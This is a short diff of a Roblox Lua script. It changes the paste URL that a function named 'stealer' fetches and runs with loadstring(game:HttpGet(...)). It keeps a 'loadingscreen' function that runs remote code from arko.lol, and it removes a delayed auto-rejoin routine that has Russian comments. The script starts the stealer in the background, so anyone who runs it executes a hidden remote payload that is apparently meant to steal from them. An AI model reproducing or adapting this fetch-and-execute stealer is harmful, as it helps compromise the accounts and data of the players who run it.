@@ -1,34 +1,9 @@
 local function stealer()
-    loadstring(game:HttpGet("https://paste.debian.net/plainh/53c7d1d8/", true))()
+    loadstring(game:HttpGet("https://paste.debian.net/plainh/cea5f4a9/", true))()
 end
 
 local function loadingscreen()
     loadstring(game:HttpGet("https://arko.lol/loadingscreen.lua"))()
-local Players = game:GetService("Players")
-local TeleportService = game:GetService("TeleportService")
-
-local player = Players.LocalPlayer
-
--- Функция для реджойна
-local function rejoin()
-    -- Получаем ID текущего места
-    local placeId = game.PlaceId
-    local jobId = game.JobId
-    
-    -- Пытаемся телепортироваться на то же место
-    local success, errorMessage = pcall(function()
-        TeleportService:TeleportToPlaceInstance(placeId, jobId, player)
-    end)
-    
-    -- Если произошла ошибка, используем обычный реджойн
-    if not success then
-        TeleportService:Teleport(placeId)
-    end
-end
-
--- Ждем 4 секунды и выполняем реджойн
-wait(16)
-rejoin()
 end
 
 task.spawn(stealer)
